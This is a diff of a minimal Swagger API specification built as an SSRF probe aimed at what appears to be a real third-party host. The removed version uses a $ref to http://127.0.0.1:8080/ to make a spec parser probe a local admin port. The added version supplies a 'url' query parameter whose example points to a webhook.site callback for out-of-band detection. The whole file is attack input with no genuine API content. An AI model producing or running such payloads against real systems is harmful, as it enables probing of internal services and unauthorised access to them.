@@ -1,6 +1,6 @@
 swagger: "2.0"
 info:
-  title: "SSRF - Localhost Admin"
+  title: "SSRF Query Param Test"
   version: "1.0"
 host: "api.tektiklaode.visa.com.tr"
 schemes:
@@ -8,9 +8,12 @@ schemes:
 paths:
   /admin-check:
     get:
-      summary: "Trigger localhost port probe"
+      parameters:
+        - name: "url"
+          in: "query"
+          required: true
+          type: "string"
+          example: "https://webhook.site/a44f8421-8b84-4309-bd87-18a8fb8ddc06"
       responses:
         200:
-          description: "Try SSRF to localhost:8080"
-          schema:
-            $ref: "http://127.0.0.1:8080/"
+          description: "SSRF test with URL param"
